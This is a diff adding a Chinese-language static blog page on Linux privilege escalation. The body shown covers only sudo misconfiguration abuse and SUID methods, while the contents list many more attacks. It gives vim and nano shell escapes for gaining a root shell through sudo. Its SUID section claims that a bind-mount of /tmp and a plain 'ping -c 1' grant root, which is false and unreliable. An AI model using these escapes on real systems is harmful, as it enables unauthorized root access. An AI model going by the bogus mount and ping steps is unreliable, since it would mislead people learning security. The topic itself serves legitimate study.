@@ -1,0 +1,1605 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Linux提权 | H4ck3r Station</title>
+<meta name="keywords" content="">
+<meta name="description" content="常规提权方式
+一、sudo滥用提权
+sudo -l提示要输入密码的原因:
+
+
+默认SUDO行为 : 需要输入当前用户的密码(不是root)密码
+
+
+sudoers配置问题: 未配置免密码访问 在/etc/sudoers文件中没有为当前用户配置NOPASSWD选项
+
+
+配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组
+
+检查当前用户所在组
+
+id username 	
+
+
+如果发现在wheel组中,检查wheel组的配置
+查看%wheel相关配置,看是否设置了NOPASSWD或要求密码
+sudo visudo
+
+
+从wheel组中移除用户
+sudo gpasswd -d username wheel
+
+
+
+
+利用步骤：
+
+
+查看当前用户sudo权限：
+sudo -l
+
+示例输出：(ALL) NOPASSWD: /usr/bin/vim
+
+
+
+利用vim提权：
+sudo /usr/bin/vim
+
+在vim中输入 :set shell=/bin/bash 回车
+然后输入 :shell 回车
+成功获得root shell
+
+
+
+利用其他命令提权：
+
+
+如果发现可以执行/usr/bin/nano：
+sudo /usr/bin/nano
+
+在nano中按Ctrl&#43;R，输入!bash，回车
+即可获得root shell
+
+
+
+
+
+说明：
+sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。
+二、SUID特殊权限提权
+利用步骤：
+
+
+查找SUID文件：
+find / -perm -u=s -type f 2&gt;/dev/null
+
+
+利用/bin/mount提权：
+mkdir /tmp/mount
+touch /tmp/mount/malicious_file
+sudo /bin/mount -o bind /tmp/mount /tmp/mount
+sudo /bin/mount /tmp/mount /tmp/mount
+
+通过此方式可获取root权限
+
+
+
+利用/bin/ping提权：">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="H4ck3r Station (Alt + H)">H4ck3r Station</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="档案">
+                    <span>档案</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Linux提权
+    </h1>
+    <div class="post-meta"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>6 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e5%b8%b8%e8%a7%84%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f" aria-label="常规提权方式">常规提权方式</a><ul>
+                        
+                <li>
+                    <a href="#%e4%b8%80sudo%e6%bb%a5%e7%94%a8%e6%8f%90%e6%9d%83" aria-label="一、sudo滥用提权">一、sudo滥用提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4" aria-label="利用步骤：">利用步骤：</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e" aria-label="说明：">说明：</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%8csuid%e7%89%b9%e6%ae%8a%e6%9d%83%e9%99%90%e6%8f%90%e6%9d%83" aria-label="二、SUID特殊权限提权">二、SUID特殊权限提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-1" aria-label="利用步骤：">利用步骤：</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-1" aria-label="说明：">说明：</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b8%89passwd%e6%96%87%e4%bb%b6%e6%8f%90%e6%9d%83" aria-label="三、passwd文件提权">三、passwd文件提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-2" aria-label="利用步骤：">利用步骤：</a></li>
+                <li>
+                    <a href="#%e9%80%9a%e8%bf%87%e4%bf%ae%e6%94%b9etcpasswd%e6%96%87%e4%bb%b6%e6%8f%90%e6%9d%83%e7%9a%84%e8%af%a6%e7%bb%86%e8%af%b4%e6%98%8e" aria-label="通过修改/etc/passwd文件提权的详细说明">通过修改/etc/passwd文件提权的详细说明</a><ul>
+                        
+                <li>
+                    <a href="#%e4%b8%80%e6%8f%90%e6%9d%83%e6%9d%a1%e4%bb%b6" aria-label="一、提权条件">一、提权条件</a></li>
+                <li>
+                    <a href="#%e4%ba%8c%e6%8f%90%e6%9d%83%e6%ad%a5%e9%aa%a4" aria-label="二、提权步骤">二、提权步骤</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e6%ad%a5%e9%aa%a41%e8%b5%8b%e4%ba%88etcpasswd%e6%96%87%e4%bb%b6%e5%86%99%e6%9d%83%e9%99%90%e5%a6%82%e6%9e%9c%e5%bd%93%e5%89%8d%e6%b2%a1%e6%9c%89%e6%9d%83%e9%99%90" aria-label="步骤1：赋予/etc/passwd文件写权限（如果当前没有权限）">步骤1：赋予/etc/passwd文件写权限（如果当前没有权限）</a><ul>
+                        
+                <li>
+                    <a href="#%e6%ad%a5%e9%aa%a42%e7%94%9f%e6%88%90%e5%8a%a0%e5%af%86%e5%af%86%e7%a0%81" aria-label="步骤2：生成加密密码">步骤2：生成加密密码</a></li>
+                <li>
+                    <a href="#%e6%ad%a5%e9%aa%a43%e6%9e%84%e9%80%a0%e6%96%b0%e7%94%a8%e6%88%b7%e6%9d%a1%e7%9b%ae" aria-label="步骤3：构造新用户条目">步骤3：构造新用户条目</a></li>
+                <li>
+                    <a href="#%e6%ad%a5%e9%aa%a44%e5%b0%86%e6%96%b0%e7%94%a8%e6%88%b7%e6%b7%bb%e5%8a%a0%e5%88%b0etcpasswd%e6%96%87%e4%bb%b6" aria-label="步骤4：将新用户添加到/etc/passwd文件">步骤4：将新用户添加到/etc/passwd文件</a></li>
+                <li>
+                    <a href="#%e6%ad%a5%e9%aa%a45%e5%88%87%e6%8d%a2%e5%88%b0%e6%96%b0%e7%94%a8%e6%88%b7" aria-label="步骤5：切换到新用户">步骤5：切换到新用户</a></li>
+                <li>
+                    <a href="#%e7%a4%ba%e4%be%8b%e6%b5%81%e7%a8%8b" aria-label="示例流程">示例流程</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%9b%9bshadow%e6%96%87%e4%bb%b6%e6%8f%90%e6%9d%83" aria-label="四、shadow文件提权">四、shadow文件提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-3" aria-label="利用步骤：">利用步骤：</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-2" aria-label="说明：">说明：</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%94ssh%e7%99%bb%e5%bd%95%e5%af%86%e7%a0%81%e7%88%86%e7%a0%b4" aria-label="五、SSH登录密码爆破">五、SSH登录密码爆破</a><ul>
+                        
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-4" aria-label="利用步骤：">利用步骤：</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-3" aria-label="说明：">说明：</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%85%ad%e9%80%9a%e8%bf%87%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e6%8f%90%e6%9d%83" aria-label="六、通过计划任务提权">六、通过计划任务提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-5" aria-label="利用步骤：">利用步骤：</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-4" aria-label="说明：">说明：</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b8%83%e5%8a%ab%e6%8c%81%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f%e6%8f%90%e6%9d%83" aria-label="七、劫持环境变量提权">七、劫持环境变量提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-6" aria-label="利用步骤：">利用步骤：</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-5" aria-label="说明：">说明：</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%85%ab%e5%88%a9%e7%94%a8%e9%80%9a%e9%85%8d%e7%ac%a6%e6%8f%90%e6%9d%83" aria-label="八、利用通配符提权">八、利用通配符提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-7" aria-label="利用步骤：">利用步骤：</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-6" aria-label="说明：">说明：</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b9%9d%e5%86%85%e6%a0%b8cve%e6%bc%8f%e6%b4%9e%e6%8f%90%e6%9d%83" aria-label="九、内核CVE漏洞提权">九、内核CVE漏洞提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-8" aria-label="利用步骤：">利用步骤：</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-7" aria-label="说明：">说明：</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%85%b6%e4%bb%96%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f" aria-label="其他提权方式">其他提权方式</a><ul>
+                        
+                <li>
+                    <a href="#1-sudo%e6%bc%8f%e6%b4%9e%e6%8f%90%e6%9d%83cve-2021-3156" aria-label="1. Sudo漏洞提权（CVE-2021-3156）">1. Sudo漏洞提权（CVE-2021-3156）</a></li>
+                <li>
+                    <a href="#2-%e5%88%a9%e7%94%a8ssh%e9%85%8d%e7%bd%ae%e9%94%99%e8%af%af%e6%8f%90%e6%9d%83" aria-label="2. 利用SSH配置错误提权">2. 利用SSH配置错误提权</a></li>
+                <li>
+                    <a href="#3-%e5%88%a9%e7%94%a8web%e5%ba%94%e7%94%a8%e6%8f%90%e6%9d%83" aria-label="3. 利用Web应用提权">3. 利用Web应用提权</a></li>
+                <li>
+                    <a href="#4-%e5%88%a9%e7%94%a8ld_preload%e6%8f%90%e6%9d%83" aria-label="4. 利用LD_PRELOAD提权">4. 利用LD_PRELOAD提权</a></li>
+                <li>
+                    <a href="#5-%e5%88%a9%e7%94%a8%e6%9c%8d%e5%8a%a1%e9%85%8d%e7%bd%ae%e9%94%99%e8%af%af%e6%8f%90%e6%9d%83" aria-label="5. 利用服务配置错误提权">5. 利用服务配置错误提权</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#linux%e9%9d%9e%e5%b8%b8%e8%a7%84%e6%8f%90%e6%9d%83%e6%96%b9%e5%bc%8f%e8%af%a6%e8%a7%a3" aria-label="Linux非常规提权方式详解">Linux非常规提权方式详解</a><ul>
+                        
+                <li>
+                    <a href="#%e4%b8%80%e5%88%a9%e7%94%a8fuse-filesystem-in-userspace-%e6%8f%90%e6%9d%83" aria-label="一、利用FUSE (Filesystem in Userspace) 提权">一、利用FUSE (Filesystem in Userspace) 提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-9" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-8" aria-label="说明">说明</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%8c%e5%88%a9%e7%94%a8system-v-ipc-%e6%8f%90%e6%9d%83" aria-label="二、利用System V IPC 提权">二、利用System V IPC 提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-1" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-10" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#exploitc%e7%a4%ba%e4%be%8b" aria-label="exploit.c示例">exploit.c示例</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-9" aria-label="说明">说明</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b8%89%e5%88%a9%e7%94%a8%e7%b3%bb%e7%bb%9f%e6%97%a5%e5%bf%97%e5%a4%84%e7%90%86%e6%9c%ba%e5%88%b6%e6%8f%90%e6%9d%83" aria-label="三、利用系统日志处理机制提权">三、利用系统日志处理机制提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-2" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-11" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-10" aria-label="说明">说明</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%9b%9b%e5%88%a9%e7%94%a8%e7%b3%bb%e7%bb%9f%e6%97%b6%e9%97%b4%e6%88%b3%e6%8f%90%e6%9d%83" aria-label="四、利用系统时间戳提权">四、利用系统时间戳提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-3" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-12" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-11" aria-label="说明">说明</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%94%e5%88%a9%e7%94%a8cgroups%e8%b5%84%e6%ba%90%e9%99%90%e5%88%b6%e6%8f%90%e6%9d%83" aria-label="五、利用cgroups资源限制提权">五、利用cgroups资源限制提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-4" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-13" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-12" aria-label="说明">说明</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%85%ad%e5%88%a9%e7%94%a8%e7%bd%91%e7%bb%9c%e9%85%8d%e7%bd%ae%e6%8f%90%e6%9d%83" aria-label="六、利用网络配置提权">六、利用网络配置提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-5" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-14" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-13" aria-label="说明">说明</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b8%83%e5%88%a9%e7%94%a8%e7%b3%bb%e7%bb%9f%e5%bf%ab%e7%85%a7%e5%92%8c%e5%a4%87%e4%bb%bd%e6%9c%ba%e5%88%b6%e6%8f%90%e6%9d%83" aria-label="七、利用系统快照和备份机制提权">七、利用系统快照和备份机制提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-6" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-15" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-14" aria-label="说明">说明</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%85%ab%e5%88%a9%e7%94%a8%e7%b3%bb%e7%bb%9f%e6%9c%8d%e5%8a%a1%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f%e6%8f%90%e6%9d%83" aria-label="八、利用系统服务环境变量提权">八、利用系统服务环境变量提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-7" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-16" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-15" aria-label="说明">说明</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b9%9d%e5%88%a9%e7%94%a8%e7%b3%bb%e7%bb%9f%e5%90%af%e5%8a%a8%e8%84%9a%e6%9c%ac%e6%8f%90%e6%9d%83" aria-label="九、利用系统启动脚本提权">九、利用系统启动脚本提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-8" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-17" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-16" aria-label="说明">说明</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%8d%81%e5%88%a9%e7%94%a8%e7%b3%bb%e7%bb%9f%e8%b5%84%e6%ba%90%e7%ae%a1%e7%90%86%e6%8f%90%e6%9d%83" aria-label="十、利用系统资源管理提权">十、利用系统资源管理提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-9" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4-18" aria-label="利用步骤">利用步骤</a></li>
+                <li>
+                    <a href="#%e8%af%b4%e6%98%8e-17" aria-label="说明">说明</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%ae%9e%e6%88%98%e6%b5%8b%e8%af%95%e4%bc%98%e5%85%88%e9%a1%ba%e5%ba%8f" aria-label="实战测试优先顺序">实战测试优先顺序</a><ul>
+                        
+                <li>
+                    <a href="#%e4%b8%80suid%e6%8f%90%e6%9d%83" aria-label="一、SUID提权">一、SUID提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-10" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e8%af%a6%e7%bb%86%e6%93%8d%e4%bd%9c%e6%ad%a5%e9%aa%a4" aria-label="详细操作步骤">详细操作步骤</a></li>
+                <li>
+                    <a href="#%e5%ae%9e%e6%88%98%e6%8a%80%e5%b7%a7" aria-label="实战技巧">实战技巧</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%8csudo%e9%85%8d%e7%bd%ae%e9%94%99%e8%af%af%e6%8f%90%e6%9d%83" aria-label="二、sudo配置错误提权">二、sudo配置错误提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-11" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e8%af%a6%e7%bb%86%e6%93%8d%e4%bd%9c%e6%ad%a5%e9%aa%a4-1" aria-label="详细操作步骤">详细操作步骤</a></li>
+                <li>
+                    <a href="#%e5%ae%9e%e6%88%98%e6%8a%80%e5%b7%a7-1" aria-label="实战技巧">实战技巧</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%b8%89passwd%e6%96%87%e4%bb%b6%e6%8f%90%e6%9d%83-1" aria-label="三、passwd文件提权">三、passwd文件提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-12" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e8%af%a6%e7%bb%86%e6%93%8d%e4%bd%9c%e6%ad%a5%e9%aa%a4-2" aria-label="详细操作步骤">详细操作步骤</a></li>
+                <li>
+                    <a href="#%e5%ae%9e%e6%88%98%e6%8a%80%e5%b7%a7-2" aria-label="实战技巧">实战技巧</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%9b%9b%e5%86%85%e6%a0%b8%e6%bc%8f%e6%b4%9e%e6%8f%90%e6%9d%83%e5%ae%9e%e6%88%98%e4%b8%ad%e9%9c%80%e5%8c%b9%e9%85%8d%e7%89%88%e6%9c%ac" aria-label="四、内核漏洞提权（实战中需匹配版本)">四、内核漏洞提权（实战中需匹配版本)</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-13" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e8%af%a6%e7%bb%86%e6%93%8d%e4%bd%9c%e6%ad%a5%e9%aa%a4-3" aria-label="详细操作步骤">详细操作步骤</a></li>
+                <li>
+                    <a href="#%e5%ae%9e%e6%88%98%e6%8a%80%e5%b7%a7-3" aria-label="实战技巧">实战技巧</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e4%ba%94%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e6%8f%90%e6%9d%83" aria-label="五、计划任务提权">五、计划任务提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-14" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e8%af%a6%e7%bb%86%e6%93%8d%e4%bd%9c%e6%ad%a5%e9%aa%a4-4" aria-label="详细操作步骤">详细操作步骤</a></li>
+                <li>
+                    <a href="#%e5%ae%9e%e6%88%98%e6%8a%80%e5%b7%a7-4" aria-label="实战技巧">实战技巧</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%85%adld_preload%e6%8f%90%e6%9d%83" aria-label="六、LD_PRELOAD提权">六、LD_PRELOAD提权</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86-15" aria-label="原理">原理</a></li>
+                <li>
+                    <a href="#%e8%af%a6%e7%bb%86%e6%93%8d%e4%bd%9c%e6%ad%a5%e9%aa%a4-5" aria-label="详细操作步骤">详细操作步骤</a></li>
+                <li>
+                    <a href="#%e5%ae%9e%e6%88%98%e6%8a%80%e5%b7%a7-5" aria-label="实战技巧">实战技巧</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e6%80%bb%e7%bb%93" aria-label="总结">总结</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="常规提权方式">常规提权方式<a hidden class="anchor" aria-hidden="true" href="#常规提权方式">#</a></h1>
+<h2 id="一sudo滥用提权">一、sudo滥用提权<a hidden class="anchor" aria-hidden="true" href="#一sudo滥用提权">#</a></h2>
+<p><code>sudo -l</code>提示要输入密码的原因:</p>
+<ol>
+<li>
+<p>默认SUDO行为 : 需要输入当前用户的密码(不是root)密码</p>
+</li>
+<li>
+<p>sudoers配置问题: 未配置免密码访问 在<code>/etc/sudoers</code>文件中没有为当前用户配置<code>NOPASSWD</code>选项</p>
+</li>
+<li>
+<p>配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组</p>
+<ol>
+<li>检查当前用户所在组</li>
+</ol>
+<pre tabindex="0"><code>id username 	
+</code></pre><ol start="2">
+<li>
+<p>如果发现在wheel组中,检查wheel组的配置</p>
+<p>查看<code>%wheel</code>相关配置,看是否设置了<code>NOPASSWD</code>或要求密码</p>
+<pre tabindex="0"><code>sudo visudo
+</code></pre></li>
+<li>
+<p>从wheel组中移除用户</p>
+<pre tabindex="0"><code>sudo gpasswd -d username wheel
+</code></pre></li>
+</ol>
+</li>
+</ol>
+<h3 id="利用步骤">利用步骤：<a hidden class="anchor" aria-hidden="true" href="#利用步骤">#</a></h3>
+<ol>
+<li>
+<p><strong>查看当前用户sudo权限</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><ul>
+<li>示例输出：<code>(ALL) NOPASSWD: /usr/bin/vim</code></li>
+</ul>
+</li>
+<li>
+<p><strong>利用vim提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/vim
+</span></span></code></pre></div><ul>
+<li>在vim中输入 <code>:set shell=/bin/bash</code> 回车</li>
+<li>然后输入 <code>:shell</code> 回车</li>
+<li>成功获得root shell</li>
+</ul>
+</li>
+<li>
+<p><strong>利用其他命令提权</strong>：</p>
+<ul>
+<li>
+<p>如果发现可以执行<code>/usr/bin/nano</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/nano
+</span></span></code></pre></div><ul>
+<li>在nano中按<code>Ctrl+R</code>，输入<code>!bash</code>，回车</li>
+<li>即可获得root shell</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="说明">说明：<a hidden class="anchor" aria-hidden="true" href="#说明">#</a></h3>
+<p>sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。</p>
+<h2 id="二suid特殊权限提权">二、SUID特殊权限提权<a hidden class="anchor" aria-hidden="true" href="#二suid特殊权限提权">#</a></h2>
+<h3 id="利用步骤-1">利用步骤：<a hidden class="anchor" aria-hidden="true" href="#利用步骤-1">#</a></h3>
+<ol>
+<li>
+<p><strong>查找SUID文件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div></li>
+<li>
+<p><strong>利用/bin/mount提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir /tmp/mount
+</span></span><span style="display:flex;"><span>touch /tmp/mount/malicious_file
+</span></span><span style="display:flex;"><span>sudo /bin/mount -o bind /tmp/mount /tmp/mount
+</span></span><span style="display:flex;"><span>sudo /bin/mount /tmp/mount /tmp/mount
+</span></span></code></pre></div><ul>
+<li>通过此方式可获取root权限</li>
+</ul>
+</li>
+<li>
+<p><strong>利用/bin/ping提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">1</span> 127.0.0.1
+</span></span></code></pre></div><ul>
+<li>通过特殊参数（如<code>-c</code>）触发SUID权限</li>
+</ul>
+</li>
+</ol>
